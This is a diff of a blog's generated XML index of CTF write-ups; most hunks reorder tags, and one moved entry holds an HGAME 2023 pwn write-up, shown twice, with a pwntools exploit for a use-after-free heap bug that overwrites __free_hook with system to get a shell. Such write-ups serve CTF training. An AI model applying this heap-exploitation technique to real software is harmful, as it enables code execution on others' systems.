@@ -20,9 +20,9 @@
       
         <tags>
             
-            <tag> awd </tag>
-            
             <tag> web </tag>
+            
+            <tag> awd </tag>
             
         </tags>
       
@@ -99,13 +99,13 @@
       
         <tags>
             
-            <tag> 格式化字符串 </tag>
-            
             <tag> 栈溢出 </tag>
             
             <tag> 沙箱 </tag>
             
             <tag> 提权 </tag>
+            
+            <tag> 格式化字符串 </tag>
             
         </tags>
       
@@ -259,13 +259,13 @@
       
         <tags>
             
-            <tag> heap </tag>
-            
             <tag> pwn </tag>
             
             <tag> shellcode </tag>
             
             <tag> fmt </tag>
+            
+            <tag> heap </tag>
             
         </tags>
       
@@ -290,11 +290,11 @@
       
         <tags>
             
-            <tag> heap </tag>
-            
             <tag> pwn </tag>
             
             <tag> shellcode </tag>
+            
+            <tag> heap </tag>
             
         </tags>
       
@@ -350,11 +350,11 @@
             
             <tag> shellcode </tag>
             
+            <tag> fmt </tag>
+            
             <tag> 数组溢出 </tag>
             
             <tag> 堆 </tag>
-            
-            <tag> fmt </tag>
             
         </tags>
       
@@ -533,9 +533,9 @@
       
         <tags>
             
-            <tag> heap </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> heap </tag>
             
         </tags>
       
@@ -633,13 +633,13 @@
       
         <tags>
             
+            <tag> heap </tag>
+            
             <tag> oob </tag>
             
             <tag> envp </tag>
             
             <tag> tls </tag>
-            
-            <tag> heap </tag>
             
         </tags>
       
@@ -762,38 +762,9 @@
       
         <tags>
             
-            <tag> heap </tag>
-            
             <tag> pwn </tag>
             
-            <tag> UAF </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>HGAME 2023 week3 pwn</title>
-      <link href="/2023/01/27/hgame-2023-week3-pwn/hgame-2023-week3-pwn/"/>
-      <url>/2023/01/27/hgame-2023-week3-pwn/hgame-2023-week3-pwn/</url>
-      
-        <content type="html"><![CDATA[<h2 id="safe-note"><a href="#safe-note" class="headerlink" title="safe note"></a>safe note</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>libc版本是2.32，要注意异或加密fd，加密方式为(堆地址&gt;&gt;12)&amp;申请的地址</p><p>1.创建并释放一个堆获取堆地址</p><p>2.填充tcache，利用unsorted bin泄露libc，计算出free_hook和system（show之前要edit</p><p>3.利用UAF漏洞实现任意地址写，把free_hook改成system，改fd的时候要使用2.32的加密方式进行加密</p><p>4.创建一个内容为&#x2F;bin&#x2F;sh的堆并将其释放</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;)file_name &#x3D; &#39;.&#x2F;vuln&#39;li &#x3D; lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)ll &#x3D; lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)context.terminal &#x3D; [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]debug &#x3D; 0if debug:    r &#x3D; remote()else:    r &#x3D; process(file_name)elf &#x3D; ELF(file_name)def dbg():    gdb.attach(r)def add(index, size):    r.sendlineafter(&#39;&gt;&#39;, b&#39;1&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))    r.sendlineafter(&#39;Size: &#39;, str(size))def delete(index):    r.sendlineafter(&#39;&gt;&#39;, b&#39;2&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))def edit(index, content):    r.sendlineafter(&#39;&gt;&#39;, b&#39;3&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))    r.sendlineafter(&#39;Content: &#39;, content)def show(index):    r.sendlineafter(&#39;&gt;&#39;, b&#39;4&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))add(0, 0x90)delete(0)show(0)heap &#x3D; u64(r.recv(5)[-5:].ljust(8, b&#39;\x00&#39;)) &lt;&lt; 12li(&#39;heap &#x3D; &#39; + hex(heap))for i in range(8):    add(i + 1 , 0x80)add(9, 0x20)add(10, 0x20)for i in range(8):    delete(i + 1)edit(8, &#39;&#39;)show(8)malloc_hook &#x3D; u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 106 - 0x10li(&#39;malloc_hook &#x3D; &#39; + hex(malloc_hook))libc &#x3D; ELF(&#39;.&#x2F;2.32-0ubuntu3.2_amd64&#x2F;libc-2.32.so&#39;)libc_base &#x3D; malloc_hook - libc.sym[&#39;__malloc_hook&#39;]free_hook &#x3D; libc_base + libc.sym[&#39;__free_hook&#39;]li(&#39;free_hook &#x3D; &#39; + hex(free_hook))system &#x3D; libc_base + libc.sym[&#39;system&#39;]li(&#39;system &#x3D; &#39; + hex(system))li(&#39;heap &#x3D; &#39; + hex(heap))delete(9)delete(10)edit(10, p64((heap&gt;&gt;12)  ^ free_hook))add(11, 0x20)edit(11, b&#39;&#x2F;bin&#x2F;sh\x00&#39;)add(12, 0x20)edit(12, p64(system))delete(11)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
-      
-      
-      <categories>
-          
-          <category> pwn </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
             <tag> heap </tag>
-            
-            <tag> pwn </tag>
             
             <tag> UAF </tag>
             
@@ -820,9 +791,38 @@
       
         <tags>
             
+            <tag> pwn </tag>
+            
             <tag> heap </tag>
             
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HGAME 2023 week3 pwn</title>
+      <link href="/2023/01/27/hgame-2023-week3-pwn/hgame-2023-week3-pwn/"/>
+      <url>/2023/01/27/hgame-2023-week3-pwn/hgame-2023-week3-pwn/</url>
+      
+        <content type="html"><![CDATA[<h2 id="safe-note"><a href="#safe-note" class="headerlink" title="safe note"></a>safe note</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>libc版本是2.32，要注意异或加密fd，加密方式为(堆地址&gt;&gt;12)&amp;申请的地址</p><p>1.创建并释放一个堆获取堆地址</p><p>2.填充tcache，利用unsorted bin泄露libc，计算出free_hook和system（show之前要edit</p><p>3.利用UAF漏洞实现任意地址写，把free_hook改成system，改fd的时候要使用2.32的加密方式进行加密</p><p>4.创建一个内容为&#x2F;bin&#x2F;sh的堆并将其释放</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;)file_name &#x3D; &#39;.&#x2F;vuln&#39;li &#x3D; lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)ll &#x3D; lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)context.terminal &#x3D; [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]debug &#x3D; 0if debug:    r &#x3D; remote()else:    r &#x3D; process(file_name)elf &#x3D; ELF(file_name)def dbg():    gdb.attach(r)def add(index, size):    r.sendlineafter(&#39;&gt;&#39;, b&#39;1&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))    r.sendlineafter(&#39;Size: &#39;, str(size))def delete(index):    r.sendlineafter(&#39;&gt;&#39;, b&#39;2&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))def edit(index, content):    r.sendlineafter(&#39;&gt;&#39;, b&#39;3&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))    r.sendlineafter(&#39;Content: &#39;, content)def show(index):    r.sendlineafter(&#39;&gt;&#39;, b&#39;4&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))add(0, 0x90)delete(0)show(0)heap &#x3D; u64(r.recv(5)[-5:].ljust(8, b&#39;\x00&#39;)) &lt;&lt; 12li(&#39;heap &#x3D; &#39; + hex(heap))for i in range(8):    add(i + 1 , 0x80)add(9, 0x20)add(10, 0x20)for i in range(8):    delete(i + 1)edit(8, &#39;&#39;)show(8)malloc_hook &#x3D; u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 106 - 0x10li(&#39;malloc_hook &#x3D; &#39; + hex(malloc_hook))libc &#x3D; ELF(&#39;.&#x2F;2.32-0ubuntu3.2_amd64&#x2F;libc-2.32.so&#39;)libc_base &#x3D; malloc_hook - libc.sym[&#39;__malloc_hook&#39;]free_hook &#x3D; libc_base + libc.sym[&#39;__free_hook&#39;]li(&#39;free_hook &#x3D; &#39; + hex(free_hook))system &#x3D; libc_base + libc.sym[&#39;system&#39;]li(&#39;system &#x3D; &#39; + hex(system))li(&#39;heap &#x3D; &#39; + hex(heap))delete(9)delete(10)edit(10, p64((heap&gt;&gt;12)  ^ free_hook))add(11, 0x20)edit(11, b&#39;&#x2F;bin&#x2F;sh\x00&#39;)add(12, 0x20)edit(12, p64(system))delete(11)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
             <tag> pwn </tag>
+            
+            <tag> heap </tag>
+            
+            <tag> UAF </tag>
             
         </tags>
       
